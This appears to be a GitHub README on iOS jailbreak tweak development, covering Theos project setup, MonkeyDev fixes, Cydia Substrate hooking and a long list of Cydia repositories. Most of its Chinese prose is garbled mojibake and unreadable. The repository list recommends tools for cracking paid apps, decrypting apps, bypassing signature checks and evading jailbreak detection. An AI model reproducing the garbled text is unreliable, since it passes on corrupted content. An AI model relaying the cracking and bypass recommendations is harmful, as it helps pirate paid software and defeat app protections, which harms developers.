# iOSåº”ç”¨é€†å‘å·¥ç¨‹-Cydiaè¶Šç‹±å¼€å‘  
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweak/
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweaks/
### Cydiapp's Cydia Repo: https://XLsn0w.github.io/Cydiapp/
<img src="https://github.com/XLsn0w/Cydiapp/blob/main/XLsn0w's%20Cydia%20Repo.png?raw=true" alt="XLsn0w" width="470" height="224" align="bottom" />

# æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·: Cydiapp


```
//                            _ooOoo_
//                           o8888888o
//                           88" . "88
//                           (| -_- |)
//                            O\ = /O
//                        ____/`---'\____
//                      .   ' \\| |// `.
//                       / \\||| : |||// \
//                     / _||||| -:- |||||- \
//                       | | \\\ - /// | |
//                     | \_| ''\---/'' | |
//                      \ .-\__ `-` ___/-. /
//                   ___`. .' /--.--\ `. . __
//                ."" '< `.___\_<|>_/___.' >'"".
//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
//                 \ \ `-. \_ __\ /__ _/ .-` / /
//         ======`-.____`-.___\_____/___.-`____.-'======
//                            `=---='
//
//         .............................................
//                  ä½›ç¥–é•‡æ¥¼            é€†å‘å¯»æ ¹
//          ä½›æ›°:
//                  å†™å­—æ¥¼é‡Œå†™å­—é—´ï¼Œå†™å­—é—´é‡Œç¨‹åºå‘˜ï¼›
//                  ç¨‹åºäººå‘˜å†™ç¨‹åºï¼Œåˆæ‹¿ç¨‹åºæ¢é…’é’±ã€‚
//                  é…’é†’åªåœ¨ç½‘ä¸Šåï¼Œé…’é†‰è¿˜æ¥ç½‘ä¸‹çœ ï¼›
//                  é…’é†‰é…’é†’æ—¥å¤æ—¥ï¼Œç½‘ä¸Šç½‘ä¸‹å¹´å¤å¹´ã€‚
//                  ä½†æ„¿è€æ­»ç”µè„‘é—´ï¼Œä¸æ„¿é èº¬è€æ¿å‰ï¼›
//                  å¥”é©°å®é©¬è´µè€…è¶£ï¼Œå…¬äº¤è‡ªè¡Œç¨‹åºå‘˜ã€‚
//                  åˆ«äººç¬‘æˆ‘å¿’ç–¯ç™«ï¼Œæˆ‘ç¬‘è‡ªå·±å‘½å¤ªè´±ï¼›
//                  ä¸è§æ»¡è¡—æ¼‚äº®å¦¹ï¼Œå“ªä¸ªå½’å¾—ç¨‹åºå‘˜ï¼Ÿ
```

# iOS Jailbreak Develop-hook-Reverse
<img src="https://github.com/XLsn0w/Cydiapp/blob/main/XLsn0w's%20Cydia%20Repo.png?raw=true" alt="XLsn0w" width="470" height="224" align="bottom" />
# æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·: Cydiapp
# æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·: Cydia
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweak/
### XLsn0w's Cydia Repo: https://XLsn0w.github.io/tweaks/
<img src="https://github.com/XLsn0w/Cydiapp/blob/main/XLsn0w's%20Cydia%20Repo.png?raw=true" alt="XLsn0w" width="470" height="224" align="bottom" />

## iOS iBoot
iBootæ˜¯ä¸€ä¸ªäºŒçº§bootloaderï¼Œ

è´Ÿè´£iOSç³»ç»Ÿçš„æ¢å¤æ¨¡å¼ã€‚
å®ƒå¯ä»¥åœ¨æ‰‹æœºä¸Šè¿è¡Œä¹Ÿå¯ä»¥é€šè¿‡USBçº¿æˆ–ä¸²å£çº¿è¿æ¥åˆ°ç”µè„‘ä¸Šã€‚

å½“è®¾å¤‡ä¸å¤„äºæ¢å¤æ¨¡å¼æ—¶ï¼ŒiBootä¼šéªŒè¯ç›®å‰è®¾å¤‡è¿è¡Œçš„iOSç‰ˆæœ¬æ˜¯å¦åˆæ³•ã€‚

å¦‚æœå‘ç°iOSç³»ç»Ÿç‰ˆæœ¬éæ³•ï¼Œå°±ä¼šå¼ºè¿«è®¾å¤‡ç³»ç»Ÿé‡å¯å¹¶å¼ºåˆ¶è¿è¡ŒiBootè½¯ä»¶ã€‚

è¿™ä¸ªbootloaderä»¥åŠ å¯†çš„æ–¹å¼å­˜å‚¨åœ¨è®¾å¤‡å†…éƒ¨ï¼Œ
æ˜¯ç”¨æ¥ä¿æŠ¤iOSç³»ç»Ÿå®Œæ•´æ€§çš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚
```
void find_boot_images(void) {// æŸ¥æ‰¾å¯åŠ¨é•œåƒ
	PROFILE_ENTER('FBI');
#if WITH_BLOCKDEV
	struct blockdev *rom_bdev;
	uint32_t i;

	/* iterate over each of the rom devices, looking for images and syscfg data */
	for (i=0; i < sizeof(platform_image_devices)/sizeof(platform_image_devices[0]); i++) {
		rom_bdev = lookup_blockdev(platform_image_devices[i].name);
		if (!rom_bdev)
			continue;

		image_search_bdev(rom_bdev, platform_image_devices[i].image_table_offset, 0);
	}
	
#if WITH_SYSCFG
	/* hook up syscfg data */
	for (i=0; i < sizeof(platform_syscfg_devices)/sizeof(platform_syscfg_devices[0]); i++) {
		if (lookup_blockdev(platform_syscfg_devices[i].name)) {
			if (syscfgInitWithBdev(platform_syscfg_devices[i].name))
				break;
		}
	}
#endif /* WITH_SYSCFG */
#endif /* WITH_BLOCKDEV */
	
	image_dump_list(false);
	PROFILE_EXIT('FBI');
}
```

## PermasigneriOS: ç­¾åä»»æ„ipaå®ç°ä¸è¿‡æœŸ
[PermasigneriOSä»‹ç»](https://mp.weixin.qq.com/s?__biz=MzI4NjI4OTg1MA==&mid=2247493186&idx=1&sn=458945fddd390afe384aa93ff36dc406&chksm=ebdd9c97dcaa15813fd6f50750d2ad9c2525504b218461f0f5ca307fc99d847a09813bca989a&token=929453386&lang=zh_CN#rd)

## æ°¸ä¹…ç­¾åipaå®ç°ä¸è¿‡æœŸæ’ä»¶æ›´æ–°ç¬¬äºŒç‰ˆ
[PermasigneriOSæ’ä»¶ä¸‹è½½](https://mp.weixin.qq.com/s?__biz=MzI4NjI4OTg1MA==&mid=2247493219&idx=1&sn=2589a7c2344c8ea577fe91762df9ee7b&chksm=ebdd9cb6dcaa15a01647e06783a0589850b3cf97993c2a3a1233e222bfc20ccbb7cdad41fbb4&mpshare=1&scene=23&srcid=0709FWFKlzW9B40p07fYNy2Z&sharer_sharetime=1657333987162&sharer_shareid=16bb66cd5fc48e6ac890c05c43ce8981%23rd)

# MonkeyDev æ”¯æŒXcode 12å®‰è£…
## ä¿®å¤Xcode12 MacOSX Package Types.xcspec not foundæŠ¥é”™
ä¸‹è½½åœ°å€: https://github.com/XLsn0w/MonkeyDev_Xcode12

# é‡åˆ°çš„é—®é¢˜
# libstdc++
`Xcode 10`ä¹‹ååˆ é™¤çš„`libstdc++`åº“

1. å…ˆä¸‹è½½ä¸‹æ¥è¿™ä¸ªé¡¹ç›®ï¼Œç„¶åæ‰“å¼€ç»ˆç«¯`cd`åˆ°`libstdc--master`æ–‡ä»¶å¤¹ï¼›
2. å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Xcode 10ï¼Œåˆ™å°†`install-xcode_10.sh`æ‹–åˆ°ç»ˆç«¯ä¸­æ‰§è¡Œå³å¯ï¼›
3. Xcode 11 ä¹‹åçš„ç‰ˆæœ¬åˆ™å°†`install-xcode_11+.sh`æ‹–åˆ°ç»ˆç«¯ä¸­æ‰§è¡Œã€‚

## iOS file not found: /usr/lib/libstdc++.dylib
```
ä¸‹è½½è§£å‹è¿™ä¸ªæ–‡ä»¶ https://github.com/MonkeyDev_Xcode12/Xcode11+libstdc++

~ % cd /Users/xlsn0w/libstdc- 

~ % sudo sh install-xcode_11+.sh
```

<p align="center">
<img src="https://theos.dev/img/github-banner.svg" alt="Theos">
</p>
<p align="center"><strong>
A cross-platform build system for creating iOS,<br>
macOS, Linux, and Windows programs.
</strong></p>
<p align="center">
<a href="https://theos.dev/">Home</a> â€“
<a href="https://theos.dev/docs/">Documentation</a> â€“
<a href="https://theos.dev/help">Get Help</a> â€“
<a href="https://twitter.com/theosdev">@theosdev</a> â€“
<a href="https://theos.dev/discord">Discord</a>
</p>

## [iOSé™çº§+SHSHå¤‡ä»½æ•™ç¨‹](https://mp.weixin.qq.com/s?__biz=MzI4NjI4OTg1MA==&mid=2247493629&idx=1&sn=c631cd20df678e19d3b9efde790dbf32&chksm=ebdd9d28dcaa143e8585f34e2438cf68f9e35480e8c1f4233ffa52fd8ee9cdc6f55c6da9bea1&token=1447383827&lang=zh_CN#rd)
### åœ¨çº¿å¤‡ä»½shsh2 : https://tsssaver.1conan.com/v2/

## Cydiaå’ŒSileo æ’ä»¶æºä½¿ç”¨æŒ‡å—
Cydia/Sileo æ’ä»¶æºä½¿ç”¨æŒ‡å—

å›¾ç‰‡

Cydia /Sileo è‡ªå¸¦æº éƒ½æ˜¯æ­£è§„, éæµ‹è¯•, æ­£ç‰ˆæ’ä»¶æ­£ç‰ˆæ’ä»¶ï¼Œ

éƒ¨åˆ†å®ç”¨å·¥å…·éœ€è¦ä»˜è´¹è´­ä¹°åŠŸèƒ½ã€‚

å¤§éƒ¨åˆ†æ’ä»¶å¯åœ¨ä¸‹åˆ—æºä¸Šå®‰è£…ã€‚

https://apt.bingner.com                             (Cydia è‡ªå¸¦)

http://apt.thebigboss.org/repofiles/cydia           (Cydia è‡ªå¸¦)

https://repo.chariz.com

https://repo.dynastic.com

https://repo.packix.com

https://havoc.app                                   (Sileo è‡ªå¸¦)


æ™®é€šäººåˆ°è¿™é‡Œå°±è¡Œäº†, å¤šå®‰è£…çæ, 

å¹³åˆ·è¿˜èƒ½å›æ¥, ä¸èƒ½åªèƒ½å‡çº§ç³»ç»Ÿäº†

MYbloXX é™çº§å¿…å¤‡

http://myxxdev.github.io

Odyssey https://repo.theodyssey.dev

Rollectra / SemiRestore11

å¹³åˆ·æ’ä»¶ï¼Œç†è®ºä¸Šé€šç”¨

http://xnu.science/repo

Succession iOS é€šç”¨å¹³åˆ·å·¥å…·

https://samgisaninja.github.io/test/ 

https://samgisaninja.github.io



å¿…å¤‡ä¾èµ–åŒ…æ’ä»¶!

è§£å†³è®¾ç½®åˆ—è¡¨ä¸æ˜¾ç¤ºæ’ä»¶å…¥å£(Preferenceloader)

æ’ä»¶ä¸éœ€è¦å®‰è£…, åœ¨ä½ å®‰è£…å…¶ä»–æ’ä»¶ä¼šè‡ªå¸¦é™„å¸¦å®‰è£…

â¶ AppList
â· Cephei Tweak Support
â¸ libcolorpicker

rpetrichä¸ªäºº æº:https://rpetri.ch/repo

â¹ Preferenceloader
âº RocketBootstrap

å®‰è£…ä¸Šè¿°äº”ä¸ªä¾èµ–è§£å†³!

AppSync Unified å¿…å¤‡!æ— è§†ç­¾åï¼Œéšæ„å®‰è£…

https://cydia.akemi.ai


ichitasoä¸ªäººæº

https://cydia.ichitaso.com



iCleaner Pro  å¿…å¤‡!æœ€å¼ºæ¸…ç†ç¥å™¨

https://ib-soft.net/cydia https://ib-soft.net/cydia/beta


Filza  å¿…å¤‡!æœ€å¼ºæ–‡ä»¶ç®¡ç†å™¨

https://tigisoftware.com/cydia


Battery Health Enable è§£å†³æ›´æ¢ç”µæ± å¥åº·åº¦æ˜¾ç¤ºé—®é¢˜

https://poomsmart.github.io/repo/


Bakgrunnur çœŸå®åå°

https://udevsharold.github.io/repo/


OTAEnabler æ¢å¤ç³»ç»Ÿæ›´æ–°

https://repo.cadoth.net



OTADisabler å±è”½ç³»ç»Ÿæ›´æ–°

https://cydia.ichitaso.com


CrashReporter å´©æºƒæŠ¥å‘Š

https://cokepokes.github.io


Appstore++ åº”ç”¨é™çº§

https://cokepokes.github.io


CyDown æ¨è! ä¸€é”®ç ´è§£æ”¶è´¹

https://julio.hackyouriphone.org

CrackerXI ç ¸å£³å·¥å…·

http://cydia.iphonecake.com


FlyJB X å±è”½è¶Šç‹±æ£€æµ‹

https://repo.xsf1re.kr


A-Bypass  æ¨è!è¶…å¼ºå±è”½è¶Šç‹±æ£€æµ‹

https://repo.co.kr


Haoict ä¸ªäººæº  ç¤¾äº¤ APP å»å¹¿å‘Šï¼Œä¿å­˜è§†é¢‘

https://haoict.github.io/cydia


ReProvision Reborn

å¤æ´»ç‰ˆè‡ªç­¾å·¥å…·

https://repo.packix.com


Zebra æ–‘é©¬è¶Šç‹±å•†åº—

https://getzbra.com/repo


Xenhtml æ’ä»¶

https://xenpublic.incendo.ws


Xeninfo æ’ä»¶

http://junesiphone.com/supersecret

Zetsu åˆ†å±æ’ä»¶ iOS 14 

https://dcsyhi1998.github.io

PullOver Pro åˆ†å±

https://c1d3r.com/repo

MilkyWay åˆ†å±

https://deontw.github.io/akusio-Repo-Mirror

shuffle è®¾ç½®å½’ç±»

https://creaturesurvive.github.io/repo

Shortmoji 2 é”®ç›˜å¢å¼º

https://miro92.com/repo/

h2 ä½œè€…æº

https://lzsxcl.github.io/repo


## è¶Šç‹±ä»¥åŠTheosç¯å¢ƒæ­å»º
```
ä¸€ã€è¶Šç‹±ä»¥åŠTheosç¯å¢ƒæ­å»º
      åœ¨å®ç°iOSæ³¨å…¥å‰ï¼Œéœ€è¦æ­å»ºç›¸å…³çš„è¶Šç‹±å¼€å‘ç¯å¢ƒï¼Œå…·ä½“éœ€è¦å®‰è£…çš„å·¥å…·å’Œæ­¥éª¤å¯ä»¥å‚è€ƒä¸Šä¸€èŠ‚ã€ŠIOSå¹³å°GDBåŠ¨æ€è°ƒè¯•ä»‹ç»ã€‹ä¸­ç¬¬ä¸€å°èŠ‚çš„å†…å®¹ã€‚

äºŒã€åˆ©ç”¨Theoså®ç°æ³¨å…¥
      åœ¨ç›¸å…³çš„ç¯å¢ƒé…ç½®å¥½åï¼Œå°±å¯ä»¥ç€æ‰‹å¯¹ioså¹³å°çš„ç¨‹åºè¿›è¡Œæ³¨å…¥äº†ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯Theosè¶Šç‹±å·¥å…·å¼€å‘å·¥å…·åŒ…ï¼Œè¯¥å·¥å…·åŠŸèƒ½å¼ºå¤§ã€æ˜“äºå®‰è£…ã€æ“ä½œç®€å•ï¼Œæ˜¯ioså¹³å°ç†æƒ³çš„è¶Šç‹±å¼€å‘å·¥å…·ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥åœ¨githubä¸ŠæŸ¥çœ‹å·¥å…·çš„æºç ã€‚æ¥ä¸‹æ¥ä¸»è¦ä»‹ç»theosçš„ç›¸å…³æ“ä½œã€‚

2.1 æ–°å»ºå·¥ç¨‹
      åœ¨Macç»ˆç«¯çš„å‘½ä»¤è¡Œä¸­åˆ‡æ¢ç›®å½•è‡³å¸¸ç”¨çš„å·¥ç¨‹ç›®å½•ï¼Œå¹¶è¾“å…¥â€œ/opt/theos/bin/nic.plâ€å‘½ä»¤ï¼Œæ­¤æ—¶å‘½ä»¤è¡Œä¼šæ˜¾ç¤ºä»¥ä¸‹åˆ—è¡¨ï¼š
UseriMac:~ user$ /opt/theos/bin/nic.pl
NIC 2.0 - New Instance Creator
------------------------------
  [1.] iphone/application
  [2.] iphone/library
  [3.] iphone/preference_bundle
  [4.] iphone/tool
  [5.] iphone/tweak
      æ¥ä¸‹æ¥é€‰æ‹©â€œ5â€å°±èƒ½åˆ›å»ºä¸€ä¸ªtweakå·¥ç¨‹ï¼Œç„¶åæŒ‰ç…§å‘½ä»¤è¡Œæç¤ºè¾“å…¥è¦åˆ›å»ºå·¥ç¨‹çš„é…ç½®ä¿¡æ¯ï¼Œå…·ä½“å†…å®¹å¦‚ä¸‹ï¼š
Choose a Template (required): 5
Project Name (required): test
Package Name [com.yourcompany.test]: com.gameprotect.test
Author/Maintainer Name [xx]: xxx
[iphone/tweak] MobileSubstrate Bundle filter [com.apple.springboard]: com.apple.springboard
[iphone/tweak] List of applications to terminate upon installation (space-separated, '-' for none) [SpringBoard]: SpringBoard
Instantiating iphone/tweak in testdxy/...
Done.
      å…¶ä¸­Project Nameã€Package Nameå’ŒAuthor Nameéƒ½æ¯”è¾ƒå¥½ç†è§£ï¼›ç¬¬å››ä¸ªMobileSubstrate Bundle filteræ˜¯è¦æ³¨å…¥ç¨‹åºçš„BundleIDï¼Œé»˜è®¤çš„è¿›ç¨‹ä¸ºcom.apple.springboardï¼Œä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿ï¼Œåœ¨æ­¤å…ˆä½¿ç”¨é»˜è®¤è¿›ç¨‹ä½œä¸ºæ³¨å…¥å¯¹è±¡ï¼Œè¯»è€…å¯ä»¥æ ¹æ®å„è‡ªéœ€è¦è¾“å…¥å¯¹åº”çš„è¿›ç¨‹åï¼›List of applications to terminate upon installationæ˜¯tweakå®‰è£…åè¦é‡å¯çš„è¿›ç¨‹åï¼Œè¯¥ä¿¡æ¯å’Œåˆšè¾“å…¥çš„è¿›ç¨‹BundleIDå¯¹åº”ï¼Œæ­¤å¤„ç¬”è€…åŒæ ·è¾“å…¥é»˜è®¤çš„è¿›ç¨‹åSpringBoardã€‚é…ç½®è¾“å…¥å®Œåå‘½ä»¤è¡Œå‡ºç°â€œDone.â€æ—¶å³å®Œæˆäº†å·¥ç¨‹çš„åˆ›å»ºå·¥ä½œã€‚
```

##      Tweakå·¥ç¨‹ç›®å½•æ–‡ä»¶ä»‹ç»

## controlæ–‡ä»¶
      é¦–å…ˆä»‹ç»çš„æ˜¯controlæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶è®°å½•äº†å·¥ç¨‹çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–°å»ºçš„testå·¥ç¨‹ä¸­controlæ–‡ä»¶å„å­—æ®µå†…å®¹å¦‚ä¸‹ï¼š
```
Package: com.gameprotect.test
Name: test
Depends: mobilesubstrate
Version: 0.0.1
Architecture: iphoneos-arm
Description: An awesome MobileSubstrate tweak!
Maintainer: xxx
Author: xxx
Section: Tweaks
```
       ä»ä¸Šé¢çš„å†…å®¹å¯ä»¥çœ‹å‡ºï¼ŒPackageã€Nameã€Maintainerã€Authorç­‰å­—æ®µæ˜¯åœ¨å»ºç«‹å·¥ç¨‹æ—¶ç”±å‘½ä»¤è¡Œè¾“å…¥çš„ï¼›
       è€ŒDependsã€Versionã€Descriptionç­‰å­—æ®µä»å­—é¢æ„ä¹‰ä¹Ÿå¾ˆå¥½ç†è§£ï¼Œ
       å€¼å¾—è¯´æ˜çš„æ˜¯Dependså­—æ®µï¼Œè¯»è€…å¯ä»¥æ ¹æ®éœ€è¦æŒ‡å®šå·¥ç¨‹çš„å›ºä»¶ç‰ˆæœ¬ã€è½¯ä»¶ç¨‹åºç­‰ä¾èµ–æ¡ä»¶ï¼Œ
       è‹¥è¿è¡Œç¯å¢ƒä¸æ»¡è¶³ä¾èµ–æ¡ä»¶åˆ™ç¨‹åºæ— æ³•è¿è¡Œï¼Œè¿™ä¸‰ä¸ªå­—æ®µåœ¨ä¸€èˆ¬æƒ…å†µä¸‹å¯ä»¥ä¸ç”¨æ›´æ”¹ï¼›
       æœ€åæ˜¯Architectureå’ŒSectionå­—æ®µï¼Œè¯¥å­—æ®µæŒ‡å®šäº†è¦å®‰è£…çš„ç¨‹åºçš„è®¾å¤‡æ¶æ„ä»¥åŠç¨‹åºç±»å‹ï¼Œä¸èƒ½æ›´æ”¹ã€‚

##  MakeFileæ–‡ä»¶
      æ¥ä¸‹æ¥ä»‹ç»MakeFileæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ç”¨æ¥æŒ‡å®šå·¥ç¨‹è¦ç”¨åˆ°çš„æ–‡ä»¶ã€æ¡†æ¶ç­‰ä¿¡æ¯ï¼Œ
      æ–°å»ºçš„testå·¥ç¨‹ä¸­MakeFileæ–‡ä»¶å„å­—æ®µå†…å®¹å¦‚ä¸‹ï¼š
```
include theos/makefiles/common.mk
TWEAK_NAME = test
test_FILES = Tweak.xm
include $(THEOS_MAKE_PATH)/tweak.mk
after-install::
    install.exec "killall -9 SpringBoard"
```
       å…¶ä¸­ç¬¬ä¸€è¡Œçš„includeå­—æ®µæŒ‡å®šäº†å·¥ç¨‹çš„common.mkæ–‡ä»¶ï¼Œ
       è¯¥æ–‡ä»¶é€šå¸¸ä¸ä¼šå˜åŒ–ï¼Œå› æ­¤ä¸éœ€ä¿®æ”¹
       ï¼›TWEAK_NAMEå­—æ®µå¡«å…¥çš„æ˜¯å»ºç«‹å·¥ç¨‹æ—¶å‘½ä»¤è¡Œè¾“å…¥çš„Project Nameï¼›
       test_FILESå­—æ®µæŒ‡å®šå·¥ç¨‹åŒ…å«çš„æºæ–‡ä»¶ï¼Œå¦‚æœå·¥ç¨‹ä¸­éœ€è¦ç”¨åˆ°å¤šä¸ªæºæ–‡ä»¶åˆ™ç”¨ç©ºæ ¼å°†å„ä¸ªæ–‡ä»¶ååˆ†å¼€ï¼›
       ç¬¬ä¸‰è¡Œçš„includeå­—æ®µæŒ‡å®šå·¥ç¨‹çš„mkæ–‡ä»¶ï¼Œè¿™é‡Œæ–°å»ºçš„æ˜¯tweakå·¥ç¨‹ï¼Œ
       æ‰€ä»¥å¡«å…¥çš„æ˜¯tweak.mkæ–‡ä»¶ï¼Œè¿˜å¯ä»¥æ ¹æ®éœ€æ±‚å¡«å…¥application.mkä»¥åŠtweak.mkæ–‡ä»¶ï¼›
       æœ€åä¸€è¡Œafter-installå­—æ®µæŒ‡å®šå®‰è£…ç¨‹åºåéœ€è¦æ‰§è¡Œçš„æ“ä½œï¼Œ
       è¿™é‡Œéœ€è¦æ³¨å…¥SpringBoardè¿›ç¨‹å¹¶æ‰§è¡Œè‡ªå·±çš„ä»£ç ï¼Œ
       å› æ­¤éœ€è¦é‡å¯SpringBoardè¿›ç¨‹è¾¾åˆ°ç›®çš„ã€‚
       
       MakeFileæ–‡ä»¶é™¤äº†è‡ªåŠ¨ç”Ÿæˆçš„è¿™äº›å­—æ®µå¤–ï¼Œ
       è¿˜å¯ä»¥æ ¹æ®åŠŸèƒ½æ‰‹åŠ¨æ·»åŠ å…¶ä»–å­—æ®µï¼š
       ARCHSå­—æ®µå¯ä»¥ç”¨æ¥æŒ‡å®šå¤„ç†å™¨æ¶æ„ï¼Œ
       ä¸€èˆ¬æƒ…å†µä¸‹å¡«å†™â€œARCHS = arm64 arm64eâ€å³å¯ï¼›
       TARGETå­—æ®µç”¨æ¥æŒ‡å®šSDKç‰ˆæœ¬ï¼›
       frameworkå­—æ®µå¯ä»¥æŒ‡å®šè¦å¯¼å…¥çš„æ¡†æ¶ï¼Œ
       æ¯”å¦‚è¿™é‡Œçš„æµ‹è¯•demoä¸­å¡«å†™çš„æ˜¯â€œtest_FRAMEWORKS = UIKitâ€ï¼Œ
       UIKitä¸ºåç»­æµ‹è¯•ä»£ç éœ€è¦ç”¨åˆ°çš„æ¡†æ¶ï¼Œ
       å¦ä¸€æ–¹é¢ï¼Œè¿˜å¯ä»¥é€šè¿‡test_PRIVATE_FRAMEWORKSå­—æ®µæŒ‡å®šè¦å¯¼å…¥çš„ç§æœ‰åº“ï¼Œ
       æ ¼å¼ä¸å˜ã€‚
       
     æµ‹è¯•çš„MakeFileæ–‡ä»¶ä¿®æ”¹åçš„å®Œæ•´å†…å®¹å¦‚ä¸‹ï¼š

```
ARCHS = armv7 arm64
include theos/makefiles/common.mk
TWEAK_NAME = test
test_FILES = Tweak.xm
test_FRAMEWORKS = UIKit
include $(THEOS_MAKE_PATH)/tweak.mk
after-install::
    install.exec "killall -9 SpringBoard"
```

## Contributors
<table>
<tr>
<td align="center"><a href="https://github.com/kirb"><img src="https://github.com/kirb.png" width="100" alt=""><br>kirb</a></td>
<td align="center"><a href="https://github.com/uroboro"><img src="https://github.com/uroboro.png" width="100" alt=""><br>uroboro</a></td>
<td align="center"><a href="https://github.com/kabiroberai"><img src="https://github.com/kabiroberai.png" width="100" alt=""><br>kabiroberai</a></td>
<td align="center"><a href="https://github.com/DHowett"><img src="https://github.com/DHowett.png" width="100" alt=""><br>DHowett</a></td>
<td align="center"><a href="https://github.com/rpetrich"><img src="https://github.com/rpetrich.png" width="100" alt=""><br>rpetrich</a></td>
</tr>
</table>

# -----------------------------------
### â€œMonkeyDev error: Signing for â€œxlsn0wDylibâ€ requires a development team.â€
### â€œSelect a development team in the Signing & Capabilities editor.â€

åœ¨Xcodeä¸­ é€‰ä¸­Dylibå¯¹åº”çš„target (in target â€˜xlsn0wDylibâ€™)

ç‚¹å‡»Build Settings ä¸­

æ·»åŠ "CODE_SIGNING_ALLOWED = NO" å…³é—­å¯¹Dylibçš„Codeç­¾å
# -----------------------------------

# Cydia Substrate 
## - åº•å±‚ä½¿ç”¨Method Swizzle å’Œ fishhookå®ç°

Cydia Substrate åŸåä¸º Mobile Substrate ç”±SaurikITå¼€å‘
å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯é’ˆå¯¹OCæ–¹æ³•ã€Cå‡½æ•°ä»¥åŠå‡½æ•°åœ°å€è¿›è¡ŒHOOKæ“ä½œã€‚å½“ç„¶å®ƒå¹¶ä¸æ˜¯ä»…ä»…é’ˆå¯¹iOSè€Œè®¾è®¡çš„ï¼Œå®‰å“ä¸€æ ·å¯ä»¥ç”¨ã€‚
å®˜æ–¹åœ°å€ï¼šhttp://www.cydiasubstrate.com/

## libsubstrate.dylib åº“æ–‡ä»¶
## libsubstitute.dylib åº“æ–‡ä»¶

ä»è¶Šç‹±çš„iPhoneä¸Šæ‹·è´/Library/Frameworks/CydiaSubstrate.framework/CydiaSubstrate åˆ°Macç”µè„‘çš„ç›®å½• /opt/theos/lib/ ,å¹¶ä¿®æ”¹åç§°ä¸º libsubstrate.dylib

### å¦‚æœæ˜¯ä½¿ç”¨unc0verè¶Šç‹±çš„è¯, ç”¨Filzaä» /usr/lib/libsubstitute.dylib å¤åˆ¶åˆ°Macç”µè„‘çš„ç›®å½• /opt/theos/lib/

Cydia Substrateä¸»è¦ç”±3éƒ¨åˆ†ç»„æˆï¼š

MobileHooker
MobileHookeré¡¾åæ€ä¹‰ç”¨äºHOOKã€‚å®ƒå®šä¹‰ä¸€ç³»åˆ—çš„å®å’Œå‡½æ•°ï¼Œåº•å±‚è°ƒç”¨objcçš„runtimeå’Œfishhookæ¥æ›¿æ¢ç³»ç»Ÿæˆ–è€…ç›®æ ‡åº”ç”¨çš„å‡½æ•°.
```
å…¶ä¸­æœ‰ä¸¤ä¸ªå‡½æ•°:
 void MSHookMessageEx(Class class, SEL selector, IMP replacement, IMP result)
 ä¸»è¦ä½œç”¨äºObjective-Cæ–¹æ³•
 
 void MSHookFunction(voidfunction,void* replacement,void** p_original)
 ä¸»è¦ä½œç”¨äºCå’ŒC++å‡½æ•°, Logosè¯­æ³•çš„%hook å°±æ˜¯å¯¹æ­¤å‡½æ•°åšäº†ä¸€å±‚å°è£…
 
 åˆ©ç”¨DCRM V4æ­å»ºCydia Repoæ•™ç¨‹ https://github.com/XLsn0w/Dumb-Cydia-Repository-Manager

æ·»åŠ å…¬ä¼—å·Cydiaæº:
Cydia Repo: https://XLsn0w.github.io/tweak/
Cydia Repo: https://XLsn0w.github.io/tweaks/
Cydia Repo: https://XLsn0w.github.io/Cydiapp/

iOSè¿›é˜¶ç¦åˆ©ç¾¤
QQä¼šå‘˜ç¾¤å·: 582415518 (å†…å«ç¨€ç¼ºèµ„æºä¸‹è½½)
ç‚¹å‡»èµèµäºŒç»´ç +WeChat

iOSæ•™å­¦
Cydia C++æºç 
iOS13-14è¶Šç‹±æºä»£ç 
iOS14.5å®Œç¾è¶Šç‹±å®ç°æºç 
``` 
## è§£å†³Macç»ˆç«¯ Failed to connect to raw.githubusercontent.com port 443
## è§£å†³ raw.githubusercontent.com æ— æ³•è®¿é—®
1.æ‰“å¼€
https://www.ipaddress.com
2.è¿™ä¸ªç½‘ç«™ä¸­çš„æŸ¥è¯¢æ¡†ä¸­è¾“å…¥ï¼šraw.githubusercontent.com   
3.å›è½¦
4.åœ¨é‡Œé¢æ‰¾åˆ°raw.githubusercontent.comç›¸å¯¹åº”çš„ipv4åœ°å€ï¼š
5.å‰å››ä¸ªåœ°å€éšä¾¿é€‰ä¸€ä¸ªå³å¯ï¼š
```
ğŸ‡ºğŸ‡¸ raw.githubusercontent.com	A	185.199.108.133
ğŸ‡ºğŸ‡¸ raw.githubusercontent.com	A	185.199.109.133
ğŸ‡ºğŸ‡¸ raw.githubusercontent.com	A	185.199.110.133
ğŸ‡ºğŸ‡¸ raw.githubusercontent.com	A	185.199.111.133
```
6.åœ¨cmd+shift+G è¾“å…¥/etc/hosts
7.åœ¨hosts æ·»åŠ ä¸€è¡Œä»£ç  å¦‚ä¸‹
```
185.199.108.133     raw.githubusercontent.com
```

## iOSè·å–ä»»ä½•ç ¸å£³ipaçš„èµ„æºå›¾ç‰‡å·¥å…·
iOS Images Extractor : https://github.com/devcxm/iOS-Images-Extractor

## iOSè°ƒè¯•UIçš„å·¥å…·Lookin
Lookin å¯ä»¥æŸ¥çœ‹ä¸ä¿®æ”¹ iOS App é‡Œçš„ UI å¯¹è±¡ï¼Œ
ç±»ä¼¼äº Xcode è‡ªå¸¦çš„ UI Inspector å·¥å…·ï¼Œ
æˆ–å¦ä¸€æ¬¾å«åš Reveal çš„è½¯ä»¶ã€‚ å®˜ç½‘ï¼šhttps://lookin.work/

## å¦‚æœ.ipaæˆ–.appæ˜¯åšäº†é˜²æŠ¤ åªèƒ½runtime classdumpdyldå¼„äº†
å‚è€ƒæ–‡ç« : https://mp.weixin.qq.com/s/m1TUrSfc4cvYbGAcGAtQeg
![](https://mmbiz.qpic.cn/mmbiz/e1CScbLqXaDU745odDN2fHpcCu9VhicGElVgalW9QJcKLicRqJNHor0FgMxuicX8CKnbeqMV6Svib6EQ9BbXbfAv7g/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1)
```
#cycript -p SpringBoard

@import net.limneos.classdumpdyld;

classdumpdyld.dumpClass(SpringBoard);
